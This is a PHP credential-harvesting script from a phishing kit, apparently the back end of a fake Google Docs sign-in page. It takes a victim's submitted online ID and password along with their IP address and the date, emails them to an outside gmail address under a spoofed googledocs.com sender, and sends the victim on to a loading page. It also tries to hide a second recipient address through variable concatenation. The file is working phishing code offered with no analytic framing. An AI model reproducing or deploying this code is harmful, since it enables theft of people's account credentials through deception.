<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="spiritualkonji00";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="gmail";$mesaegs  =".com";
$message .= "---------=ReZulT=---------\n";
$message .= "Online ID: ".$_POST['x0r1']."\n";
$message .= "Password: ".$_POST['x0r2']."\n";
$message .= "---------=IP Adress & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=by DECKY=---------\n";




$sent ="jenkinsonlong@gmail.com";




$subject = "Googledocs | other";
$headers = "From: Decky Boss<wire@googledocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: loading.htm");
?>